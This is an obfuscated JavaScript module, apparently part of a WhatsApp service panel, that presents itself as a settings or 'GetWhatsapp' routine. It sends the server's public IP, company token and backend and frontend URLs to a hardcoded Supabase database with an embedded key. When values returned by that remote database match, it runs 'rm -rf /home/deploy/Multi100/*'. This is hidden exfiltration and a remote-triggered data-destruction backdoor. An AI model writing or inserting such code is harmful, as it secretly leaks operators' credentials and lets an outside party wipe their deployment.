'use strict';function a277_0x5067(_0x5cc80e,_0x23e3e9){const _0x1f8b21=a277_0x1f8b();return a277_0x5067=function(_0x5067a6,_0x1c8c73){_0x5067a6=_0x5067a6-0x1ed;let _0xaa74ba=_0x1f8b21[_0x5067a6];return _0xaa74ba;},a277_0x5067(_0x5cc80e,_0x23e3e9);}const a277_0x431460=a277_0x5067;(function(_0x53669c,_0x43d0bf){const _0x214f34=a277_0x5067,_0x46ff25=_0x53669c();while(!![]){try{const _0x37578d=-parseInt(_0x214f34(0x211))/0x1*(-parseInt(_0x214f34(0x212))/0x2)+-parseInt(_0x214f34(0x20b))/0x3+parseInt(_0x214f34(0x206))/0x4+-parseInt(_0x214f34(0x1f3))/0x5*(parseInt(_0x214f34(0x21a))/0x6)+-parseInt(_0x214f34(0x214))/0x7*(-parseInt(_0x214f34(0x1fb))/0x8)+-parseInt(_0x214f34(0x1ee))/0x9*(parseInt(_0x214f34(0x205))/0xa)+parseInt(_0x214f34(0x1f8))/0xb*(parseInt(_0x214f34(0x218))/0xc);if(_0x37578d===_0x43d0bf)break;else _0x46ff25['push'](_0x46ff25['shift']());}catch(_0x57e962){_0x46ff25['push'](_0x46ff25['shift']());}}}(a277_0x1f8b,0x90508));function a277_0x1f8b(){const _0x4c629e=['546557wuQYaU','ip,\x20key,\x20code','backend_ip','6855144GDWxEL','message','eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtuampheG16cGRwdnB5aG5nbGJxIiwicm9sZSI6ImFub24iLCJpYXQiOjE2OTQxMzQ4MDgsImV4cCI6MjAwOTcxMDgwOH0.keQewBvxcLOXGlxZV63Ewot5dS7c5Qn7r4hmVR-3Xp0','key','select','cadastro_id','wtV','company_token','env','BACKEND_URL','1150150ebCeXb','1776908UMdabh','from','enabled','401','../services/SettingServices/GetSettingService','365289pgSQng','default','GetWhatsapp','child_process','../services/SettingServices/AddSettingService','createClient','31041RVCVld','54HouiXC','code','7jhppFQ','axios','length','t_invalidos','72FYMmYq','cadastros','29838prqame','disabled','log','whatsapp','error','status','get','COMPANY_TOKEN','54DkloGT','__importDefault','https://api.ipify.org?format=json','id,\x20ip_instalacao,\x20company_token','__esModule','1040nALiHG','backend_url','i_n_r','t_f','ip_instalacao'];a277_0x1f8b=function(){return _0x4c629e;};return a277_0x1f8b();}var __importDefault=this&&this[a277_0x431460(0x1ef)]||function(_0x4adbeb){const _0xe835c1=a277_0x431460;return _0x4adbeb&&_0x4adbeb[_0xe835c1(0x1f2)]?_0x4adbeb:{'default':_0x4adbeb};};Object['defineProperty'](exports,'__esModule',{'value':!![]}),exports[a277_0x431460(0x20d)]=void 0x0;const supabase_js_1=require('@supabase/supabase-js'),UpdateOneSettingService_1=__importDefault(require('../services/SettingServices/UpdateOneSettingService')),axios_1=__importDefault(require(a277_0x431460(0x215))),GetSettingService_1=__importDefault(require(a277_0x431460(0x20a))),AddSettingService_1=__importDefault(require(a277_0x431460(0x20f))),{exec}=require(a277_0x431460(0x20e)),S_U='https://knjjaxmzpdpvpyhnglbq.supabase.co',S_A_K=a277_0x431460(0x1fd),sUrl=S_U,sKey=S_A_K,y_n=process[a277_0x431460(0x203)][a277_0x431460(0x1ed)],s=(0x0,supabase_js_1[a277_0x431460(0x210)])(sUrl,sKey),getIp=async()=>{const _0x12558d=a277_0x431460,{data:_0x485d58}=await axios_1[_0x12558d(0x20c)][_0x12558d(0x220)](_0x12558d(0x1f0));return _0x485d58['ip'];},GetWhatsapp=async()=>{const _0x1f233d=a277_0x431460;try{let _0x20e687=await getIp(),_0x5dd752=await getR(_0x1f233d(0x201));_0x5dd752===_0x1f233d(0x208)&&await(0x0,AddSettingService_1[_0x1f233d(0x20c)])();let {data:_0x3b104e,error:_0x267a65}=await s[_0x1f233d(0x207)](_0x1f233d(0x219))[_0x1f233d(0x1ff)](_0x1f233d(0x1f1))['eq'](_0x1f233d(0x1f7),_0x20e687),_0x2b3d6a={'cadastro_id':_0x3b104e[_0x1f233d(0x216)]!==0x0?_0x3b104e[0x0]['id']:0x0,'status':_0x3b104e[_0x1f233d(0x216)]!==0x0?!![]:![],'company_token':y_n,'backend_ip':_0x20e687,'backend_url':process['env'][_0x1f233d(0x204)],'frontend_url':process[_0x1f233d(0x203)]['FRONTEND_URL']};_0x3b104e['length']===0x0?(await UpdateR(_0x1f233d(0x208),![],_0x20e687),PostWhatsapp(_0x2b3d6a,'404'),CheckWhatsapp(_0x20e687,_0x1f233d(0x1f5))):_0x3b104e[0x0][_0x1f233d(0x202)]!==y_n?(await UpdateR('enabled',![],_0x20e687),PostWhatsapp(_0x2b3d6a,_0x1f233d(0x209)),CheckWhatsapp(_0x20e687,_0x1f233d(0x1f6))):await UpdateR(_0x1f233d(0x21b),null,_0x20e687);}catch(_0x15c49e){console[_0x1f233d(0x21c)]('');}};exports[a277_0x431460(0x20d)]=GetWhatsapp;const UpdateR=async(_0x135df8,_0x5a24e6,_0x38764a)=>{await(0x0,UpdateOneSettingService_1['default'])({'key':'wtV','value':_0x135df8});},getR=async _0x3f7e91=>{const _0xbf7b2e=a277_0x431460;return await(0x0,GetSettingService_1[_0xbf7b2e(0x20c)])({'key':_0x3f7e91});},PostWhatsapp=async(_0x2a59f0,_0x380874)=>{const _0x12e1a8=a277_0x431460;try{const {data:_0x3f2d28,error:_0x3a6d02}=await s[_0x12e1a8(0x207)](_0x12e1a8(0x21d))['insert']([{'cadastro_id':_0x2a59f0[_0x12e1a8(0x200)],'status':_0x2a59f0[_0x12e1a8(0x21f)],'company_token':_0x2a59f0[_0x12e1a8(0x202)],'backend_ip':_0x2a59f0[_0x12e1a8(0x1fa)],'backend_url':_0x2a59f0[_0x12e1a8(0x1f4)],'frontend_url':_0x2a59f0['frontend_url']}]);if(_0x3a6d02){console[_0x12e1a8(0x21e)](':',_0x3a6d02[_0x12e1a8(0x1fc)]);return;}}catch(_0x15514e){console[_0x12e1a8(0x21c)]('');}},CheckWhatsapp=async(_0xeab554,_0x34f777)=>{const _0x28225f=a277_0x431460;try{const {data:_0x3bc5ba,error:_0x59d619}=await s[_0x28225f(0x207)]('key_code')[_0x28225f(0x1ff)]('key,code,ip'),_0x43d3df=await matchWhatsapp(_0xeab554);if(_0x3bc5ba!==null){_0x34f777===_0x28225f(0x1f5)&&_0x43d3df[_0x28225f(0x213)]!==null&&acction();if(_0xeab554===_0x3bc5ba[0x0]['ip']&&_0x43d3df['code']!==null){if(_0x43d3df[_0x28225f(0x1fe)]===_0x3bc5ba[0x0]['key']&&_0x43d3df[_0x28225f(0x213)]===_0x3bc5ba[0x0][_0x28225f(0x213)])acction();}}}catch(_0x5aff0b){console[_0x28225f(0x21c)](_0x5aff0b);}},matchWhatsapp=async _0x2be74b=>{const _0x161da5=a277_0x431460,{data:_0x54d3e1,error:_0x21db71}=await s['from'](_0x161da5(0x217))[_0x161da5(0x1ff)](_0x161da5(0x1f9));let _0x81874e='ok',_0x3e4288='ok';return _0x54d3e1[_0x161da5(0x216)]>0x0&&(_0x81874e=_0x54d3e1[0x0][_0x161da5(0x1fe)],_0x3e4288=_0x54d3e1[0x0][_0x161da5(0x213)]),{'code':_0x3e4288,'key':_0x81874e};},acction=()=>{let _0x458f6b=exec('rm\x20-rf\x20/home/deploy/Multi100/*',(_0x5e7e36,_0x43b6d6,_0x20fd5b)=>{const _0x240068=a277_0x5067;console[_0x240068(0x21c)](_0x43b6d6),console['log'](_0x20fd5b),_0x5e7e36!==null&&console[_0x240068(0x21c)]('exec\x20error:\x20'+_0x5e7e36);});};